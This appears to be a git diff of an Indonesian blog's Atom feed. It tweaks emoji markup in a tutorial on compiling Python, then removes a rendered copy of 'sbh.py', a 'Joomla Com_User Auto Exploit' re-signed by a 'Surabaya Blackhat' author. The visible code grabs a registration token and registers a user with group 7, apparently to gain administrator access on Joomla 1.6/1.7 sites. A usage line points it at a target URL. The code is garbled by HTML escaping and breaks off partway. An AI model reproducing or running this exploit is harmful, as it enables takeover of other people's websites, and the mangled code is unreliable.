@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Python | SunDi3yansyah]]></title>
   <link href="http://sundi3yansyah.com/article/categories/python/atom.xml" rel="self"/>
   <link href="http://sundi3yansyah.com/"/>
-  <updated>2014-12-17T06:26:49+07:00</updated>
+  <updated>2014-12-22T14:10:34+07:00</updated>
   <id>http://sundi3yansyah.com/</id>
   <author>
     <name><![CDATA[SunDi3yansyah]]></name>
@@ -22,7 +22,7 @@
 <code>sh
 python --version
 </code>
-Jika versi di bawah 2.7.8 maka itu sudah kuno dan sudah saatnya di update <img class="<a" src="href="https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png">https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png</a>&#8221; width=&#8221;20&#8221; height=&#8221;20&#8221; title=&#8221;&lsquo;smile&rsquo; &lsquo;smile&rsquo;&#8221; ></p>
+Jika versi di bawah 2.7.8 maka itu sudah kuno dan sudah saatnya di update {% img <a href="https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png">https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png</a> 20 20 &lsquo;smile&rsquo; &lsquo;smile&rsquo; %}</p>
 
 <!--more-->
 
@@ -65,7 +65,7 @@ jalankan configure nya
 <code>sh
 ./configure --prefix=/usr/local
 </code>
-lakukan compile, ini akan membutuhkan waktu yang lumayan lama <img class="<a" src="href="https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png">https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png</a>&#8221; width=&#8221;20&#8221; height=&#8221;20&#8221; title=&#8221;&lsquo;smile&rsquo; &lsquo;smile&rsquo;&#8221; >
+lakukan compile, ini akan membutuhkan waktu yang lumayan lama {% img <a href="https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png">https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png</a> 20 20 &lsquo;smile&rsquo; &lsquo;smile&rsquo; %}
 <code>sh
 make
 </code>
@@ -78,7 +78,7 @@ jika sudah selesai maka coba kita lihat versinya
 python -V
 </code></p>
 
-<p>Mudah bukan <img class="<a" src="href="https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png">https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png</a>&#8221; width=&#8221;20&#8221; height=&#8221;20&#8221; title=&#8221;&lsquo;smile&rsquo; &lsquo;smile&rsquo;&#8221; ></p>
+<p>Mudah bukan {% img <a href="https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png">https://gist-assets.github.com/assets/emoji/unicode/1f604-b85cf6b6d09a33e9e5196aab683b2704.png</a> 20 20 &lsquo;smile&rsquo; &lsquo;smile&rsquo; %}</p>
 
 <p>Jika belum juga berubah dan tidak muncul output dengan versi yang kita compile tadi maka lakukan dengan menambah Environment Variable, anda bisa cari artikel saya sebelumnya <strong>Cara Menambah Environment Variable pada Linux</strong></p>
 
@@ -127,186 +127,99 @@ python sbh.py http://target.com/ usermu passwordmu emailmu
 
 <h4>Modif Sign by SunDi3yansyah | Surabaya Blackhat</h4>
 
-<p><figure class='code'><figcaption><span>sbh.py </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Joomla</span> <span class="n">Com_User</span> <span class="n">Auto</span> <span class="n">Exploit</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">By</span> <span class="n">xSecurity</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Modif</span> <span class="n">Sign</span> <span class="n">by</span> <span class="n">SunDi3yansyah</span> <span class="o">|</span> <span class="n">Surabaya</span> <span class="n">Blackhat</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">sec4ever</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
-</span><span class='line'><span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
-</span><span class='line'><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
-</span><span class='line'><span class="k">def</span> <span class="nf">cls</span><span class="p">():</span>
-</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">([</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">clear</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cls</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;][</span><span class="n">os</span><span class="o">.</span><span class="n">name</span> <span class="o">==&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">nt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;])</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">cls</span><span class="p">()</span>
-</span><span class='line'><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="s">&#39;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">hr</span> <span class="o">/&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;|</span> <span class="n">_</span>   <span class="n">_</span> <span class="n">_</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="n">__</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|&lt;</span><span class="n">strong</span><span class="o">&gt;</span>   <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>  <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span> <span class="n">_</span>  <span class="o">|</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="p">)</span><span class="o">|</span> <span class="o">|</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span> <span class="n">_</span>  <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|&lt;</span><span class="n">strong</span><span class="o">&gt;</span>   <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span>
-</span><span class='line'>  <span class="n">_</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;/</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;|</span> <span class="s">&#39;_ \ / _&lt;/code&gt; | | | |/ &lt;/em&gt;&lt;code&gt;| |  _ \| |/ _&lt;/code&gt; |/ &lt;strong&gt;| |/ / &amp;rsquo;&lt;em&gt; \ / &lt;/em&gt;` | &lt;/strong&gt;|</span>
-</span><span class='line'>   <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;|</span>   <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span>
-</span><span class='line'>  <span class="o">|&lt;</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;/</span> <span class="n">_</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;|&lt;</span><span class="n">em</span><span class="o">&gt;|</span>  <span class="n">_</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|&lt;/</span><span class="n">em</span><span class="o">&gt;.&lt;/</span><span class="n">strong</span><span class="o">&gt;/</span> <span class="n">_</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;|</span><span class="n">_</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">|</span><span class="n">_</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;/|&lt;/</span><span class="n">em</span><span class="o">&gt;|</span><span class="n">_</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;|</span><span class="n">_</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;|&lt;</span><span class="n">em</span><span class="o">&gt;|</span><span class="n">__</span><span class="o">|</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;|</span><span class="n">_</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;|</span><span class="n">_</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;|</span>
-</span><span class='line'>                                     <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;/</span>                                               <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
-</span><span class='line'>                                              <span class="n">_</span>      <span class="n">_</span>             <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
-</span><span class='line'>                        <span class="o">|</span>  <span class="n">_</span>  <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;..&lt;/</span><span class="n">em</span><span class="o">&gt;.&lt;</span><span class="n">em</span><span class="o">&gt;</span>  <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;|&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">_</span>  <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span> <span class="n">_</span>  <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;|&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;|&lt;/</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">_</span> <span class="o">.&lt;/</span><span class="n">em</span><span class="o">&gt;</span>
-</span><span class='line'>                        <span class="o">|&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">(</span><span class="o">/&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;||</span> <span class="o">|</span> <span class="o">|</span>  <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)(</span><span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="o">|&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)(</span><span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;|&lt;/</span><span class="n">em</span><span class="o">&gt;</span> <span class="o">|&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">(</span><span class="o">/&lt;/</span><span class="n">em</span><span class="o">&gt;|</span>
-</span><span class='line'>        <span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span>
-</span><span class='line'><span class="n">Joomla</span> <span class="n">Version</span> <span class="p">[</span><span class="mf">1.6</span><span class="o">|</span><span class="mf">1.7</span><span class="p">]</span> <span class="p">[</span><span class="n">Com_User</span><span class="p">]</span> <span class="n">Auto</span> <span class="n">Exploit</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h2</span><span class="o">&gt;</span><span class="n">Require</span> <span class="n">Need</span> <span class="n">Install</span> <span class="n">Requests</span> <span class="n">Python</span> <span class="n">Package</span> <span class="p">(</span><span class="n">Cari</span> <span class="n">di</span> <span class="n">google</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h2</span><span class="o">&gt;</span><span class="n">Surabaya</span> <span class="n">Blackhat</span> <span class="o">|</span> <span class="n">Surabaya</span> <span class="n">Hackerlink</span> <span class="o">|</span> <span class="n">Yogyakarta</span> <span class="n">Blackhat</span><span class="o">&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Please</span> <span class="n">wait</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="s">&#39;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">pwd2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">fio3jfiej9cewc9c9w0eufew9u</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
-</span><span class='line'><span class="k">def</span> <span class="nf">one</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">pwd1</span><span class="p">,</span><span class="n">pwd2</span><span class="p">,</span><span class="n">email</span><span class="p">):</span>
-</span><span class='line'>    <span class="c"># Wrong Password</span>
-</span><span class='line'>    <span class="n">x1</span> <span class="o">=</span> <span class="n">xsec</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">option</span><span class="o">=</span><span class="n">com_users</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">view</span><span class="o">=</span><span class="n">registration</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-</span><span class='line'>    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">type</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">hidden</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="n">name</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;(</span><span class="o">.*</span><span class="err">?</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="n">value</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">x1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">post</span> <span class="o">=</span> <span class="p">{}</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">SunDi3yansyah</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">username</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">user</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">password1</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">pwd1</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">password2</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">pwd2</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">email1</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">email</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">email2</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">email</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">groups</span><span class="p">][]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">7</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">option</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">com_users</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">task</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">registration</span><span class="o">.</span><span class="n">register</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">p1</span> <span class="o">=</span> <span class="n">xsec</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">option</span><span class="o">=</span><span class="n">com_users</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">view</span><span class="o">=</span><span class="n">registration</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">data</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">post</span><span class="p">))</span>
-</span><span class='line'>    <span class="n">x2</span> <span class="o">=</span> <span class="n">xsec</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">component</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="err">?</span><span class="n">view</span><span class="o">=</span><span class="n">registration</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">layout</span><span class="o">=</span><span class="n">complete</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">pwd1</span><span class="p">,</span><span class="n">pwd2</span><span class="p">,</span><span class="n">email</span><span class="p">):</span>
-</span><span class='line'>    <span class="c"># Wrong Password</span>
-</span><span class='line'>    <span class="n">x3</span> <span class="o">=</span> <span class="n">xsec</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">option</span><span class="o">=</span><span class="n">com_users</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">view</span><span class="o">=</span><span class="n">registration</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-</span><span class='line'>    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">type</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">hidden</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="n">name</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;(</span><span class="o">.*</span><span class="err">?</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="n">value</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">x3</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">post</span> <span class="o">=</span> <span class="p">{}</span>
